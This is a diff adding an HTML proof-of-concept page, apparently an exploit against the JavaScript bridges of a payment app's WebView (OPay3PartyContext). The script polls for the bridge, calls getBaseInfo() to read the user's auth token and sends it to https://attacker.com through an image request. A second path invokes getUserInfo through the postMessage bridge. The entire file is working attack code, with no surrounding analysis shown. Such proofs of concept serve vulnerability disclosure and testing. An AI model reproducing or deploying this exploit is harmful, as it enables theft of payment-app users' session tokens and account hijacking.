@@ -1,0 +1,34 @@
+<!-- attacker.html -->
+  <!DOCTYPE html>
+  <html>
+  <head><meta charset="utf-8"></head>
+  <body>
+  <script>
+  // 等待 JS 桥注册完成
+  var MAX = 20, i = 0;
+  var t = setInterval(function() {
+      i++;
+      if (i > MAX) { clearInterval(t); return; }
+
+      // 路径 A: WebFoundationFragment 桥（OPay3PartyContext）
+      if (window.OPay3PartyContext && typeof OPay3PartyContext.getBaseInfo === 'function') {
+          clearInterval(t);
+          var d = JSON.parse(OPay3PartyContext.getBaseInfo());
+          document.body.innerText = "token=" + d.token;
+          new Image().src = "https://attacker.com/c?token=" + encodeURIComponent(d.token);
+          return;
+      }
+
+      // 路径 B: postMessage 桥（CustomJsBindingsInterface）
+      if (window.OPay3PartyContext && typeof OPay3PartyContext.postMessage === 'function') {
+          clearInterval(t);
+          // 枚举 OWebJSManager 注册的函数名
+          OPay3PartyContext.postMessage(JSON.stringify({
+              functionName: "getUserInfo",
+              functionData: ""
+          }));
+      }
+  }, 500);
+  </script>
+  </body>
+  </html>
